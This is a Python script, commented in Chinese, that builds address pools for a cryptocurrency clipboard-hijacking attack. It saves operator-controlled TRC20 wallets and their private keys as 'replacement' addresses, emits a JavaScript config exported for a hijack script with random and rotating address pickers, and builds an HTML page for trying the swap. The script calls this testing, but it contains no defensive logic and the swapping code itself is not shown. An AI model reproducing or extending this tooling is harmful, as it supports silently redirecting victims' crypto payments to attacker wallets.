#!/usr/bin/env python3
"""
剪贴板劫持测试专用地址生成器
生成符合特定要求的地址池
"""

import json
import time
from trc20_simple import TRC20Generator

def generate_clipboard_config():
    """生成剪贴板劫持测试配置"""
    print("🎯 生成剪贴板劫持测试地址...")
    
    generator = TRC20Generator()
    config = {
        "generated": time.strftime('%Y-%m-%d %H:%M:%S'),
        "addresses": {
            "TRC20": {
                "primary": [],      # 主要地址（用于替换）
                "backup": [],       # 备用地址
                "test": []          # 测试地址（受害者地址）
            }
        }
    }
    
    # 生成主要地址（用于劫持替换）
    print("生成主要地址...")
    primary = generator.generate_batch(10)
    config["addresses"]["TRC20"]["primary"] = [
        addr["address"] for addr in primary
    ]
    
    # 生成备用地址
    print("生成备用地址...")
    backup = generator.generate_batch(10)
    config["addresses"]["TRC20"]["backup"] = [
        addr["address"] for addr in backup
    ]
    
    # 生成测试地址（模拟受害者地址）
    print("生成测试地址...")
    test = generator.generate_batch(20)
    config["addresses"]["TRC20"]["test"] = [
        addr["address"] for addr in test
    ]
    
    # 保存完整配置（包含私钥）
    full_config = {
        "generated": config["generated"],
        "addresses": {
            "TRC20": {
                "primary": primary[:10],
                "backup": backup[:10],
                "test": test[:20]
            }
        }
    }
    
    # 保存为JSON
    with open("clipboard_config_full.json", "w") as f:
        json.dump(full_config, f, indent=2)
    
    # 生成JavaScript配置（仅地址）
    js_content = f"""// 剪贴板劫持测试配置
// 生成时间: {config["generated"]}

const CLIPBOARD_CONFIG = {{
  // TRC20-USDT地址
  TRC20: {{
    // 用于替换的地址（你控制的）
    primary: {json.dumps(config["addresses"]["TRC20"]["primary"], indent=4)},
    
    // 备用地址池
    backup: {json.dumps(config["addresses"]["TRC20"]["backup"], indent=4)},
    
    // 测试地址（模拟用户地址）
    test: {json.dumps(config["addresses"]["TRC20"]["test"], indent=4)}
  }},
  
  // 添加其他常见地址格式
  ETH: {{
    primary: [
      "0x742d35Cc6634C0532925a3b844Bc9e7595f2bd20",
      "0xde0B295669a9FD93d5F28D9Ec85E40f4cb697BAe"
    ],
    test: [
      "0x5aAeb6053F3E94c9b9876A699EF3a8d1f7E7dc51",
      "0x281055afc982d96fab65b3a49cac8b878184cb16"
    ]
  }},
  
  BTC: {{
    primary: [
      "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
      "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
    ],
    test: [
      "bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq",
      "3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy"
    ]
  }}
}};

// 工具函数：获取随机地址
function getRandomAddress(type = 'TRC20', pool = 'primary') {{
  const addresses = CLIPBOARD_CONFIG[type]?.[pool] || [];
  return addresses[Math.floor(Math.random() * addresses.length)];
}}

// 工具函数：轮换地址
let currentIndex = 0;
function getRotatingAddress(type = 'TRC20', pool = 'primary') {{
  const addresses = CLIPBOARD_CONFIG[type]?.[pool] || [];
  if (addresses.length === 0) return null;
  
  const address = addresses[currentIndex % addresses.length];
  currentIndex++;
  return address;
}}

// 导出给剪贴板劫持脚本使用
if (typeof module !== 'undefined' && module.exports) {{
  module.exports = CLIPBOARD_CONFIG;
}}
"""
    
    # 保存JavaScript配置
    with open("clipboard_config.js", "w", encoding="utf-8") as f:
        f.write(js_content)
    
    # 生成HTML测试页面
    html_content = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>剪贴板劫持测试页面</title>
    <style>
        body {{ font-family: -apple-system, sans-serif; max-width: 800px; margin: 50px auto; }}
        .address {{ 
            background: #f5f5f5; 
            padding: 10px; 
            margin: 10px 0; 
            border-radius: 5px;
            font-family: monospace;
            word-break: break-all;
        }}
        button {{ 
            padding: 10px 20px; 
            margin: 5px;
            cursor: pointer;
        }}
        .test-area {{
            background: #e8f4f8;
            padding: 20px;
            border-radius: 8px;
            margin: 20px 0;
        }}
    </style>
</head>
<body>
    <h1>🧪 剪贴板劫持测试</h1>
    
    <div class="test-area">
        <h2>测试地址（点击复制）</h2>
        <p>以下是一些测试TRC20地址，尝试复制它们：</p>
        
        {"".join([f'<div class="address" onclick="copyAddress(this)">{addr}</div>' for addr in config["addresses"]["TRC20"]["test"][:5]])}
    </div>
    
    <div class="test-area">
        <h2>输入框测试</h2>
        <input type="text" placeholder="粘贴地址到这里" style="width: 100%; padding: 10px;">
        <textarea placeholder="或粘贴到这里" style="width: 100%; height: 100px; padding: 10px; margin-top: 10px;"></textarea>
    </div>
    
    <div class="test-area">
        <h2>按钮测试</h2>
        <button onclick="copyTestAddress()">📋 复制测试地址</button>
        <button id="result">粘贴结果会显示在这里</button>
    </div>
    
    <script src="clipboard_config.js"></script>
    <script>
        // 复制地址函数
        function copyAddress(element) {{
            const address = element.textContent;
            navigator.clipboard.writeText(address).then(() => {{
                element.style.background = '#d4edda';
                setTimeout(() => element.style.background = '#f5f5f5', 1000);
            }});
        }}
        
        // 复制测试地址
        function copyTestAddress() {{
            const testAddr = CLIPBOARD_CONFIG.TRC20.test[0];
            navigator.clipboard.writeText(testAddr).then(() => {{
                alert('已复制测试地址: ' + testAddr);
            }});
        }}
        
        // 监听粘贴事件
        document.addEventListener('paste', (e) => {{
            const pasted = e.clipboardData.getData('text');
            document.getElementById('result').textContent = '粘贴: ' + pasted;
        }});
    </script>
    
    <!-- 加载劫持脚本进行测试 -->
    <!-- <script src="cache.js"></script> -->
</body>
</html>"""
    
    # 保存测试页面
    with open("clipboard_test.html", "w", encoding="utf-8") as f:
        f.write(html_content)
    
    print("\n✅ 生成完成！")
    print(f"📁 完整配置: clipboard_config_full.json (包含私钥)")
    print(f"📁 JS配置: clipboard_config.js (仅地址)")
    print(f"📁 测试页面: clipboard_test.html")
    print(f"\n主要地址示例:")
    for i, addr in enumerate(config["addresses"]["TRC20"]["primary"][:3], 1):
        print(f"{i}. {addr}")

if __name__ == "__main__":
    generate_clipboard_config()